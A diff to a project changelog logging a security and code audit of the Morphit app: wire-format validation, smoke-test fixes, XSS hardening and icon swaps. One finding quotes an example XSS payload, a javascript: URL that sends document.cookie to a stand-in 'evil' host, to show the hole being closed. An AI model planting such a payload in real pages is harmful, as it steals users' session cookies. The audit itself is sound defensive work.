@@ -1,3 +1,102 @@
+# TARBALL — Morphit pre-launch hardening, Part 122 (in progress, checkpoint 30-DD-DD — recursive deep-deep on cp30 + cp30-DD with FULL SECURITY + CODE AUDIT pass per Ken's directive.  Plus Ken-supplied LTC icon swap mid-session.  20 audit items: 11 DD findings (10 closed + 1 false-positive cleared) + 6 SEC findings closed + 3 CODE findings closed.  Pre-existing latent bugs uncovered: SEC-1 orphaned XSS defender, SEC-3 cross-network-mis-send through wire, SEC-5/CODE-A+B ~9-month broken smoke since cp21, SEC-2 cp26 design-decision reversal incomplete.  Two icon swaps (USDC + LTC) cleanly applied with same accessibility parity treatment.
+
+CP30-DD-DD SCOPE: switching from drift-hunting to a proper security + code audit on the cp30 + cp30-DD wire-format work.  Walked the wire-format trust gates, defense-in-depth defenders, UI-vs-logic enforcement asymmetries, cross-field-coupling validation, broken-since-cp21 smokes, replace-handler asset_network gaps, and ops-cli wizard surface.
+
+CP30-DD-DD INVENTORY:
+
+**11 DD findings (10 closed + 1 false-positive cleared):**
+
+DD-DD-1 HIGH — ops-cli wizard render.ts missing 8 multi-network env-var emissions.  Closed across 5 sites: 8 new DEFAULT_USD{T,C}_*_CHAT_LINK_URL constants + ChatLinkExplorersResult interface gains usdt/usdc sub-objects + stepChatLinkExplorers prompts (grouped "accept all 4 defaults / customize each one") + step explainer rewrite + render.ts emissions + disabled-assets-policy examples.
+
+DD-DD-2 MEDIUM — init.ts summary covers DASH (cp27 latent drift) + multi-network URL summary lines.
+
+DD-DD-3 HIGH would-fail-TS-compile — init-smoke.ts fixture had 2-field chatLinkExplorers vs 7-field interface; TS build would have failed.  Fixed.
+
+DD-DD-4 (FALSE POSITIVE, cleared) — my own test used wrong namespacing; all 19 critical USDC i18n keys actually present in all 10 locales at correct paths.
+
+DD-DD-5 HIGH META-DOC-DRIFT — docs/ADDING-A-COIN.md had zero USDC mentions; rewrote multi-network section to cover both stablecoins + EVM-shape-collision warning + 4-canonical-wire-format-surfaces checklist.
+
+DD-DD-6 CRITICAL SMOKE-FAILING — asset-registry-smoke.ts immutability check hardcoded `ASSETS.length !== 4`; would fail on every cp30 run.  Fixed with dynamic original-length capture per LL #25.
+
+DD-DD-7 (parked) — `docs/adr/` contains `0000-*.md` in addition to 0001-0028; brag #134 says "27 ADRs / 0001-0028"; verify 0000's role next session.
+
+**6 SECURITY findings, all closed:**
+
+**SEC-1 HIGH** XSS-defense-missing — isValidChatLinkTemplate orphan defender was defined and documented as defense-in-depth against hostile indexer serving malicious URLs, but NEVER called at any consumer site.  Hostile indexer serving `chat_link_urls.usdc.erc20 = "javascript:fetch('https://evil/'+document.cookie)"` would have rendered as `<a href="javascript:...">` and executed on click.  Closed across 3 consumer sites: externalExplorerUrl + usdtExplorerUrl + usdcExplorerUrl; all fall through to bundled default on validation failure.  Import of isValidChatLinkTemplate from urlsCore added.  Pre-existing class hole; cp30 inherited and reproduced it across new USDC surface.
+
+**SEC-2 HIGH** PRIVACY-REGRESSION — AddressShareModal.svelte:140 had `jitterEligible = $derived(method !== 'usdt')` left over from cp26.  cp30 reversed the no-jitter decision (ADR-0028 Decision 2) and shipped jitterStablecoinAmount, but the UI gate kept blocking USDT jitter.  Net effect: USDT amounts shipped un-jittered despite brag list claim #29 and the ADR.  Closed: gate flipped to `$derived(true)`; comment block updated to cite ADR-0028 Decision 2 rationale.
+
+**SEC-3 HIGH** CROSS-NETWORK-MIS-SEND — Decoder validated address/txid against asset-wide shape AND network against allowlist INDEPENDENTLY; never cross-checked.  Hostile peer could send `{method:'usdc', network:'spl', address:'0xevmformat...'}` and the decoder accepted it; downstream UI displayed "SPL USDC address" with an EVM-shape string.  Closed: imported validateUsdtAddress + validateUsdcAddress + validateUsdtTxid + validateUsdcTxid from networks.ts (no circular dep — networks.ts has no imports) and cross-checked in 4 sites: AddressPayload + FundsSentPayload decoders × USDT + USDC branches.
+
+**SEC-4 MEDIUM** BROKEN-LINKS — ERC-20/Base/Polygon/BEP-20 txid regex accepts bare 64-hex but Etherscan/BaseScan/PolygonScan/BscScan require `0x` prefix.  Closed by adding 0x-prefix normalization in 4 sites: bundledUsdtExplorerUrl + bundledUsdcExplorerUrl + operator-override paths in usdtExplorerUrl + usdcExplorerUrl.
+
+**SEC-5/CODE-A CRITICAL** SMOKE-FAILING since cp21 — apps/indexer/scripts/asset-registry-smoke.ts:92 asserts `startsWith('/coins/')` but BCH/LTC/DASH/USDC use `/icons/` prefix.  Broken for ~9 months (cp21 + cp23 + cp24 + cp27 + cp30 = 5 asset-addition checkpoints).  Closed: accept either prefix.
+
+**SEC-5/CODE-B CRITICAL** SMOKE-FAILING since cp21 — same smoke line 109-110 had `valid = new Set(['btc','xmr','blurt','usdt'])`; throws on first cp21+ asset.  Closed: extended to all 8 lowercase tickers.
+
+**SEC-6 HIGH** ROBUSTNESS — Encoder lacked symmetric per-network address/txid validation matching the decoder's SEC-3 fix.  Buggy callers got silent wire-format messages the receiver discards.  Closed by adding symmetric encoder-side validation in encodeAddressPayload + encodeFundsSentPayload — buggy callers now get clear developer-time errors.
+
+**3 CODE-audit findings, all closed:**
+
+**CODE-1 HIGH** WIRE-FORMAT-CONTRACT — Decoder + encoder accepted USDT/USDC payloads with NO network field, but ADR-0023 + ADR-0028 + UI all require it.  Closed in 4 sites: decoder address + decoder funds_sent + encoder address + encoder funds_sent.
+
+**CODE-2 MEDIUM** ORPHANED — /dev/icons page hardcoded ASSETS = ['btc','xmr','blurt','yubikey'] (pre-USDT!).  Dev surface used to visually verify icon rendering was missing 5 assets.  Closed: extended to all 8 tradable assets + yubikey with structured `{key,path}` shape respecting the `/coins/` vs `/icons/` directory split.
+
+**CODE-3 HIGH** WIRE-FORMAT-INCONSISTENCY — orderReplace.ts handler had NO asset_network validation logic at all.  Replace operations on USDT/USDC orders silently accepted any/missing asset_network value.  Closed across 5 sites in orderReplace.ts: Validated interface field + validate() extraction + probe SELECT extension + handle() lock-down + Validated return statement.  New rejection reason: `replace_asset_network_change_forbidden`.  Per ADR-0023/0028, network is substance (not detail) for multi-network assets.
+
+**Icon swaps:**
+- `apps/web/static/icons/icon-ltc.svg` (Ken-supplied this session, replaced 1024×1024 viewBox version with 82.6×82.6 viewBox version; standard Litecoin "Ł" silver `#a6a9aa` on white disc, two paths; added aria-label + title for screen-reader parity; no width/height attrs to remove)
+- `apps/web/static/icons/icon-usdc.svg` (Ken-supplied prior session, persistent in sandbox)
+
+**Files touched this checkpoint:**
+
+Code:
+- apps/web/src/lib/explorer/urls.ts (SEC-1, SEC-4)
+- apps/web/src/lib/components/AddressShareModal.svelte (SEC-2)
+- apps/web/src/lib/chat/payload.ts (SEC-3, SEC-6, CODE-1; per-network imports + cross-check in 4 sites + reject missing-network for multi-network methods)
+- apps/web/src/lib/assets/networks.ts (SEC-4; per-network txid prefix normalization)
+- apps/indexer/scripts/asset-registry-smoke.ts (SEC-5/CODE-A + CODE-B)
+- apps/indexer/src/indexer/handlers/orderReplace.ts (CODE-3; 5 changes)
+- apps/ops-cli/src/init/steps.ts (DD-DD-1)
+- apps/ops-cli/src/init/render.ts (DD-DD-1)
+- apps/ops-cli/src/commands/init.ts (DD-DD-2)
+- apps/ops-cli/scripts/init-smoke.ts (DD-DD-3)
+- packages/asset-registry/scripts/asset-registry-smoke.ts (DD-DD-6)
+- apps/web/src/routes/[lang]/dev/icons/+page.svelte (CODE-2)
+
+Docs + icons:
+- docs/ADDING-A-COIN.md (DD-DD-5)
+- docs/AUDIT-2026-05.md (cp30-DD-DD entry appended)
+- docs/REVISIT-LIST.md (maintenance entry prepended)
+- TARBALL.md (this entry)
+- apps/web/static/icons/icon-ltc.svg (Ken swap)
+
+**CP30-DD-DD FINAL STATE:**
+
+- Smoke baseline: cp30-DD baseline ~3,345 + this session adds NO new scenarios but FIXES 4 broken ones (SEC-5/CODE-A + SEC-5/CODE-B + DD-DD-6 + DD-DD-3 TS-compile path).  Net: ~3,345 scenarios that now actually pass when they should.
+- Locale parity unchanged at 2,680 × 10 = 26,800; brag list 280; ADR count 28; FAQ entries 113
+- 11 DD findings + 6 SEC findings + 3 CODE findings = 20 audit items total, all closed inline or cleared as false-positive
+- Pre-existing latent bugs uncovered: SEC-1 (orphaned defender), SEC-3 (cross-network-mis-send through wire), SEC-5/CODE-A+B (broken-smoke-since-cp21), SEC-2 (incomplete cp26→cp30 design reversal)
+- Two icon swaps cleanly applied with consistent accessibility hardening (aria-label + title)
+
+**PATTERN LESSONS RECORDED (numbered 31-34 for continuity with cp30-DD-DD's 28-30):**
+
+31. Defense-in-depth functions documented as "in case the indexer is hostile" need to be ACTUALLY CALLED at consumer sites.  isValidChatLinkTemplate sat unused across BTC/XMR/BCH/LTC/DASH/USDT for many checkpoints.  Pattern: when shipping a defensive validator, grep for callers immediately; orphaned defenders are no defense.
+
+32. Multi-network wire format trust gates need cross-field-coupling validation — `validate(A, B)` not `validate(A) + validate(B)`.
+
+33. A `$derived(condition)` UI gate is a SEPARATE trust gate from underlying logic.  Reversing previous design decisions requires grepping for the previous decision's enforcement sites in UI components, not just the dispatcher.
+
+34. Smoke files asserting `startsWith('/old-prefix')` or hardcoded allowlist sets become latent always-fails when conventions evolve.  When you add a new asset and a smoke fails, the FIRST question is "was this smoke ever right?" — not "what do I need to add to make it pass?"
+
+ONE FOLLOW-UP REVISIT: orderReplace `replace_asset_network_change_forbidden` path needs test coverage (gate logic correct, just not exercised by regression).
+
+ONE DEFERRED FINDING (DD-DD-7): docs/adr/ contains 0000-*.md in addition to 0001-0028; brag #134 says "27 ADRs / 0001-0028"; verify 0000's role next session.
+
+PARKED (external-blockers — unchanged from cp30/cp30-DD): (a) live full-stack Ansible deploy on a fresh Ubuntu 24.04 VM; (b) v1.0.0-beta.1 release ceremony steps 8/9/10 (Forgejo runner standup blocker).
+
+---
+
 # TARBALL — Morphit pre-launch hardening, Part 122 (in progress, checkpoint 30-DD — deep-deep on cp30 USDC addition + Ken-supplied USDC icon swap.  14 findings, all 14 fixed inline.  The most consequential were DD-10/10b/11 — wiring-missing findings exposing that the per-network USDT explorer URL override has apparently never actually worked on the public API since Part 121 cp3 (9 checkpoints!) because the indexer-side `InstanceResponse` interface never declared `chat_link_urls.usdt`.  cp30 made the same mistake with USDC.  Both fixed by adding 8 new indexer Config fields + Zod schema entries + env vars and wiring them through the InstanceResponse body.
 
 CP30-DD SCOPE: closure of every cp30 gap surfaced by walking the canonical wire-format surfaces, the prices store, the FAQ surface, the docs surface, and the smoke surface independently per cp28 LL #11-15 + cp29 LL #16-17 + cp30 LL #18-22.  Plus Ken's USDC icon swap mid-session (replaced placeholder with Circle's canonical "$" + dual C-curves mark, accessibility-hardened with aria-label + title + sizing-attribute normalization).
